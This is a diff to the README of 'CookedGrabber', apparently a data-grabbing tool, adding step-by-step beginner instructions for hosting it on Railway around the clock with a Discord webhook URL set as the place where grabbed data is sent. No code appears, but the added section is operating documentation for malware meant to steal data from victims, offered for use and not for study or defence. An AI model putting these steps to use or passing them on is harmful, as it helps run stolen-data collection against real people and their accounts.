@@ -44,9 +44,20 @@
 - **Python 3.x** (*python 3.9 used for the project.*)
 - **Modules:** `$ pip install -r requirements.txt`
 
-## How to use ? ❄
+## How to deploy on Railway ? 🚂 (For Beginners)
 
-There is 2 ways to run the script.
+It is extremely easy to deploy this grabber on Railway for 24/7 online hosting.
+
+1. Create a free account on [Railway.app](https://railway.app/).
+2. Click on **New Project**, then select **Deploy from GitHub repo**.
+3. Choose your forked repository of `CookedGrabber`.
+4. Click **Add Variables**, and create a new variable named `WEBHOOK_URL`.
+5. Paste your Discord Webhook URL as the value for `WEBHOOK_URL` and click **Add**.
+6. Railway will automatically build and deploy your app. The grabber is now active and will use your webhook!
+
+## How to use locally ? ❄
+
+There is 2 ways to run the script locally.
 
 ### 1. First way
 
